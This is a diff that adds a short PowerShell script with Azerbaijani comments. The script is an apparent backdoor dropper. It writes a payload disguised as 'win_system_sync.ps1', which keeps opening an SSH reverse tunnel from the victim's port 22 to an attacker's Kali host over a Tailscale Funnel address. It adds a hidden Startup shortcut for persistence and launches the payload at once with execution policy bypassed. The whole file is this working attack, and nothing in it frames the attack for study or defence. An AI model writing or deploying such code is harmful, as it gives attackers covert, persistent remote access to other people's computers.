@@ -1,0 +1,28 @@
+# Ayarlar
+$ts_url = "kali-2.tail4e3bb1.ts.net" # Bura öz Funnel linkini yaz
+$kali_user = "root"
+$p_path = "$env:APPDATA\win_system_sync.ps1"
+$l_path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\win_system_sync.lnk"
+
+# 1. SSH Reverse Tunnel Beyni
+$code = @"
+while(`$true){
+    try {
+        # Sənin Kali-nə tunel atır: Hədəf 22 -> Kali 8888
+        ssh -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -N -R 8888:localhost:22 ${kali_user}@${ts_url}
+    } catch {}
+    Start-Sleep -Seconds 20
+}
+"@
+$code | Out-File -FilePath $p_path -Encoding ascii
+
+# 2. Restart üçün Startup qısayolu
+if(!(Test-Path $l_path)){
+    $s = (New-Object -ComObject WScript.Shell).CreateShortcut($l_path)
+    $s.TargetPath = "powershell.exe"
+    $s.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p_path`""
+    $s.Save()
+}
+
+# 3. Dərhal işə sal
+Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p_path`""
